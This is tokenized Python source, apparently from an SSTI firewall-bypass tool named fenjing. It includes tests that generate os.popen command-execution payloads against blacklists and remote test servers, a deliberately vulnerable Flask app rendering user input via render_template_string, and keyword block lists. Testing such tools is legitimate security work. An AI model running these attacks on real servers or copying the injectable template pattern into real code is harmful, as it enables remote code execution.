<EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestIntegerAdd ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestIntegerSub ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestPath ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . local_blacklist = None <EOL> self . subm = PathSubmitter ( <EOL> url = VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> requester = HTTPRequester ( interval = SLEEP_INTERVAL ) , <EOL> ) <EOL> class TestHard1 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestHard2 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestHard3 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestHard4 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestHard5 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestHard6 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestHard7 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestStaticWAF ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> class TestStaticWAF2 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> class TestDynamicWAF ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = None <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> class TestWeirdWAF ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = None <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> class TestReversedWAF ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = None <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> self . subm . add_tamperer ( lambda x : x [ : : - <NUM_LIT> ] ) <EOL> class TestLengthLimit1WAF ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = None <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> def test_waf ( self ) : <EOL> cracker = Cracker ( self . subm , ** self . cracker_other_opts ) <EOL> full_payload_gen = cracker . crack ( ) <EOL> assert full_payload_gen is not None , self . __class__ . __name__ <EOL> payload , will_print = full_payload_gen . generate ( <EOL> const . OS_POPEN_READ , <EOL> "<STR_LIT>" + self . __class__ . __name__ , <EOL> ) <EOL> assert ( <EOL> payload is not None <EOL> ) , self . __class__ . __name__ <EOL> self . assertTrue ( will_print ) <EOL> if self . local_blacklist : <EOL> for w in self . local_blacklist : <EOL> self . assertNotIn ( w , payload ) <EOL> resp = self . subm . submit ( payload ) <EOL> assert resp is not None <EOL> self . assertIn ( '<STR_LIT>' , resp . text , resp . text ) <EOL> class TestLengthLimit2WAF ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = None <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> def test_waf ( self ) : <EOL> cracker = Cracker ( self . subm , options = Options ( environment = TemplateEnvironment . FLASK ) ) <EOL> result = cracker . crack_eval_args ( ) <EOL> assert result is not None <EOL> subm , will_print = result <EOL> payload = "<STR_LIT>" <EOL> self . assertTrue ( will_print ) <EOL> resp = subm . submit ( payload ) <EOL> assert resp is not None <EOL> self . assertIn ( "<STR_LIT>" , resp . text ) <EOL> class TestReplacedWAFAvoid ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> self . cracker_other_opts = { "<STR_LIT>" : Options ( replaced_keyword_strategy = ReplacedKeywordStrategy . AVOID ) } <EOL> class TestReplacedWAFAvoid2 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> self . cracker_other_opts = { "<STR_LIT>" : Options ( replaced_keyword_strategy = ReplacedKeywordStrategy . AVOID ) } <EOL> class TestReplacedWAFDoubleTapping ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> self . cracker_other_opts = { "<STR_LIT>" : Options ( replaced_keyword_strategy = ReplacedKeywordStrategy . DOUBLETAPPING ) } <EOL> class TestJinjaEnv ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> self . cracker_other_opts = { "<STR_LIT>" : Options ( environment = TemplateEnvironment . JINJA2 ) } <EOL> class TestFix500 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_remote_waf ( "<STR_LIT>" ) <EOL> self . cracker_other_opts = { "<STR_LIT>" : Options ( environment = TemplateEnvironment . FLASK ) } <EOL> </s>
<s> import sys <EOL> sys . path . append ( "<STR_LIT>" ) <EOL> import unittest <EOL> import fenjing <EOL> from fenjing . payload_gen import PayloadGenerator , expression_gens <EOL> from fenjing import const <EOL> import logging <EOL> from jinja2 import Template , TemplateError <EOL> fenjing . payload_gen . logger . setLevel ( logging . ERROR ) <EOL> def get_payload_gen ( blacklist , context ) : <EOL> def waf_func ( x ) : <EOL> return all ( word not in x for word in blacklist ) <EOL> return PayloadGenerator ( waf_func , context ) <EOL> class PayloadGenTestsTargetRules ( unittest . TestCase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . context = { <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> } <EOL> self . context_payload = "<STR_LIT>" <EOL> self . payload_gen = get_payload_gen ( [ ] , self . context ) <EOL> def target_test ( self , target ) : <EOL> gen_type = target [ <NUM_LIT> ] <EOL> for gen_func in expression_gens [ gen_type ] : <EOL> try : <EOL> target_list = gen_func ( self . context , * target [ <NUM_LIT> : ] ) <EOL> except Exception as e : <EOL> raise RuntimeError ( f"<STR_LIT>" ) from e <EOL> result = self . payload_gen . generate_by_list ( target_list ) <EOL> if not result : <EOL> continue <EOL> try : <EOL> str_result , _ , _ = result <EOL> Template ( self . context_payload + f"<STR_LIT>" ) . render ( ) <EOL> except TemplateError as e : <EOL> raise RuntimeError ( f"<STR_LIT>" ) from e <EOL> def test_targets ( self ) : <EOL> targets = [ <EOL> ( const . VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( const . ZERO , ) , <EOL> ( const . INTEGER , <NUM_LIT> ) , <EOL> ( const . INTEGER , <NUM_LIT> ) , <EOL> ( const . PLUS , ( const . INTEGER , <NUM_LIT> ) , ( const . INTEGER , <NUM_LIT> ) ) , <EOL> ( const . MULTIPLY , ( const . INTEGER , <NUM_LIT> ) , ( const . INTEGER , <NUM_LIT> ) ) , <EOL> ( const . MULTIPLY , ( const . STRING , "<STR_LIT>" ) , ( const . INTEGER , <NUM_LIT> ) ) , <EOL> ( const . STRING_PERCENT , ) , <EOL> ( const . STRING_LOWERC , ) , <EOL> ( const . STRING_PERCENT_LOWER_C , ) , <EOL> ( const . STRING_MANY_PERCENT_LOWER_C , <NUM_LIT> ) , <EOL> ( const . STRING , "<STR_LIT>" ) , <EOL> ( const . STRING , "<STR_LIT>" ) , <EOL> ( const . STRING , "<STR_LIT>" ) , <EOL> ( const . STRING , "<STR_LIT>" ) , <EOL> ( const . MODULE_OS ) , <EOL> ( const . OS_POPEN_READ , "<STR_LIT>" ) , <EOL> ] <EOL> for target in targets : <EOL> logging . info ( "<STR_LIT>" , repr ( target ) ) <EOL> self . target_test ( target ) <EOL> class PayloadGenTestCaseSimple ( unittest . TestCase ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . payload_gen = get_payload_gen ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> ] , <EOL> { } , <EOL> ) <EOL> def test_string ( self ) : <EOL> strings = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for string in strings : <EOL> self . assertIsNotNone ( self . payload_gen . generate ( const . STRING , string ) ) <EOL> def test_os_popen_read ( self ) : <EOL> self . assertIsNotNone ( <EOL> self . payload_gen . generate ( const . OS_POPEN_READ , "<STR_LIT>" ) <EOL> ) <EOL> class PayloadGenTestCaseNoNumber ( unittest . TestCase ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . payload_gen = get_payload_gen ( <EOL> [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> { <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> } , <EOL> ) <EOL> def test_integers ( self ) : <EOL> for num in range ( <NUM_LIT> , <NUM_LIT> ) : <EOL> self . assertIsNotNone ( self . payload_gen . generate ( const . INTEGER , num ) ) <EOL> def test_string ( self ) : <EOL> strings = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for string in strings : <EOL> self . assertIsNotNone ( self . payload_gen . generate ( const . STRING , string ) ) <EOL> def test_os_popen_read ( self ) : <EOL> self . assertIsNotNone ( <EOL> self . payload_gen . generate ( const . OS_POPEN_READ , "<STR_LIT>" ) <EOL> ) <EOL> class PayloadGenTestCaseHard ( unittest . TestCase ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . payload_gen = get_payload_gen ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> { <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> } , <EOL> ) <EOL> def test_targets ( self ) : <EOL> targets = [ <EOL> ( const . STRING_PERCENT , ) , <EOL> ( const . STRING_LOWERC , ) , <EOL> ( const . INTEGER , <NUM_LIT> ) , <EOL> ( const . STRING , "<STR_LIT>" ) , <EOL> ( const . STRING_PERCENT_LOWER_C , ) , <EOL> ( const . STRING_MANY_PERCENT_LOWER_C , <NUM_LIT> ) , <EOL> ( const . STRING , "<STR_LIT>" ) , <EOL> ] <EOL> for target in targets : <EOL> result = self . payload_gen . generate ( target [ <NUM_LIT> ] , * target [ <NUM_LIT> : ] ) <EOL> self . assertIsNotNone ( result , repr ( target ) ) <EOL> def test_string ( self ) : <EOL> strings = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for string in strings : <EOL> self . assertIsNotNone ( self . payload_gen . generate ( const . STRING , string ) , string ) <EOL> def test_os_popen_read ( self ) : <EOL> self . assertIsNotNone ( <EOL> self . payload_gen . generate ( const . OS_POPEN_READ , "<STR_LIT>" ) <EOL> ) <EOL> </s>
<s> from flask import Flask , request , render_template , render_template_string , send_from_directory <EOL> import re <EOL> import os <EOL> import logging <EOL> app = Flask ( __name__ ) <EOL> app . logger . disabled = True <EOL> log = logging . getLogger ( '<STR_LIT>' ) <EOL> log . disabled = True <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def index ( ) : <EOL> return str ( '<STR_LIT>' ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def secr3t ( ) : <EOL> name = request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> template = <EOL> bl = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , "<STR_LIT>" , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> for i in bl : <EOL> if i in name : <EOL> return str ( '<STR_LIT>' ) <EOL> two_bracket_pattern = r"<STR_LIT>" <EOL> two_bracket_match = re . search ( two_bracket_pattern , name ) <EOL> bracket_comma_bracket_pattern = r"<STR_LIT>" <EOL> bracket_comma_bracket_match = re . search ( bracket_comma_bracket_pattern , name ) <EOL> bracket_bracket_line_pattern = r"<STR_LIT>" <EOL> bracket_bracket_line_match = re . search ( bracket_bracket_line_pattern , name ) <EOL> comma_bracket_bracket_line_pattern = r"<STR_LIT>" <EOL> comma_bracket_bracket_line_match = re . search ( comma_bracket_bracket_line_pattern , name ) <EOL> pattern_mo = r"<STR_LIT>" <EOL> matche_mo = re . search ( pattern_mo , name ) <EOL> if two_bracket_match : <EOL> if bracket_comma_bracket_match . group ( <NUM_LIT> ) : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> elif comma_bracket_bracket_line_match : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> elif bracket_bracket_line_match : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> else : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> if matche_mo : <EOL> print ( "<STR_LIT>" + name ) <EOL> return str ( '<STR_LIT>' ) <EOL> a = render_template_string ( template % name ) <EOL> print ( "<STR_LIT>" + name ) <EOL> if "<STR_LIT>" in a : <EOL> return a + str ( '<STR_LIT>' ) <EOL> return a <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def robots ( ) : <EOL> return send_from_directory ( os . path . join ( app . root_path , '<STR_LIT>' ) , <EOL> '<STR_LIT>' , mimetype = '<STR_LIT>' ) <EOL> if __name__ == '<STR_LIT>' : <EOL> app . run ( host = '<STR_LIT>' , port = <NUM_LIT> , debug = False ) <EOL> </s>
<s> import logging <EOL> import random <EOL> import string <EOL> import traceback <EOL> import time <EOL> import re <EOL> from copy import copy <EOL> from collections import Counter , namedtuple <EOL> from functools import lru_cache <EOL> from typing import Dict , Callable , Tuple , Union , List <EOL> from . const import ( <EOL> DetectMode , <EOL> ReplacedKeywordStrategy , <EOL> DANGEROUS_KEYWORDS , <EOL> WafFunc , <EOL> ) <EOL> from . colorize import colored <EOL> from . submitter import Submitter <EOL> from . options import Options <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> Result = namedtuple ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> dangerous_keywords = copy ( DANGEROUS_KEYWORDS ) <EOL> random . shuffle ( dangerous_keywords ) <EOL> render_error_keywords = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> def grouped_payloads ( size = <NUM_LIT> , sep = "<STR_LIT>" ) -> List [ str ] : <EOL> return [ <EOL> sep . join ( dangerous_keywords [ i : i + size ] ) <EOL> for i in range ( <NUM_LIT> , len ( dangerous_keywords ) , size ) <EOL> ] <EOL> def removeprefix_string ( text : str , prefix : str ) -> str : <EOL> if text . startswith ( prefix ) : <EOL> return text [ len ( prefix ) : ] <EOL> return text <EOL> def get_next_p ( b : str ) -> List [ int ] : <EOL> answer = [ ] <EOL> for i , c in enumerate ( b ) : <EOL> if i == <NUM_LIT> : <EOL> answer . append ( - <NUM_LIT> ) <EOL> continue <EOL> p = answer [ i - <NUM_LIT> ] 